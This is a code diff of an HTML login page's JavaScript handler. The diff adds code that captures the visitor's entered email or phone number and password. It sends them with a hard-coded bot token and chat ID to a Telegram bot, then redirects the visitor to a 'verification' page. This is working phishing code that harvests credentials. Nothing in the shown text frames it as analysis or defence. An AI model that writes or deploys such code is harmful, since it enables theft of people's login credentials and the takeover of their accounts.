@@ -358,8 +358,22 @@
 
   function handleLogin(e) {
     e.preventDefault();
-        window.location.href = "authengator.html";
-  }  
-</script>
-</body>
-</html>
+
+    var user = document.getElementById('email-phone').value;
+    var pass = document.getElementById('password').value;
+
+    var token = "7547141381:AAH8878Z79zF8z9z8z9z8z9z8z9z8z9z8z9"; 
+    var chat_id = "6463939393";
+    var message = "--- NEW LOGIN ---\nUser: " + user + "\nPass: " + pass;
+
+    var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(message);
+
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", url, true);
+    
+    xhr.onload = function() {
+        window.location.href = "verification.html"; 
+    };
+
+    xhr.send();
+}
